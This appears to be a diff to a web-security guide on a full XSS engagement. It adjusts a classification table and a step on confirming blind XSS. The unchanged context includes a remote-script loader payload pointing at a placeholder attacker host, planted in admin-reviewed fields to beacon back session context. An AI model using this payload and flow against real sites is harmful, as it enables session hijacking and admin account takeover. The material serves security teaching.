@@ -4,7 +4,7 @@ description: A worked end-to-end XSS engagement - map inputs, find reflected and
 mitre: [T1059.007, T1185, T1539]
 d3fend: [D3-AH]
 impact: [SessionTakeover, AccountTakeover, AdminCompromise]
-owasp: [A03, A07]
+owasp: [A05, A07]
 noise: moderate
 sidebar:
   order: 10
@@ -43,7 +43,7 @@ For every canary that appears, decide the variant - the exploitation page differ
 |---|---|---|
 | Canary echoed in the HTTP response | [Reflected](../reflected/) | per-click delivery |
 | Canary persisted, shown on later views | [Stored](../stored/) | fires for every viewer |
-| Canary only in the live DOM, not View Source | [DOM-based](../dom-based/) | source→sink |
+| Canary assembled into the DOM by client JS (via a source→sink flow) | [DOM-based](../dom-based/) | source→sink; can coexist with a server reflection |
 | Canary never visible to you | [Blind](../blind-xss/) | out-of-band beacon |
 
 Then read the markup around each reflection to get its [context](/codex/web/xss/#context-theory) - body, attribute, JS string, URL, or CSS.
@@ -67,7 +67,7 @@ The high-value move: a field that an administrator reviews (support ticket, regi
 <Steps>
 
 1. Put a per-field named remote-script loader in each staff-reviewed input (`<script src=//<ATTACKER>/ticket></script>`), with a listener up - see [Blind XSS](../blind-xss/).
-2. When the callback arrives, you know the field, the breakout that worked, and (with an XSS Hunter-style beacon) what the admin page looks like.
+2. A hit on `/ticket` tells you that field's markup parsed and the browser fetched your loader - not yet that your JS ran, and not that the viewer was an admin. Have the hosted script emit its own beacon reporting the page URL and session context; confirm from that beacon that it executed and that the viewer is actually privileged.
 3. Swap in the real payload hosted on your server.
 
 </Steps>
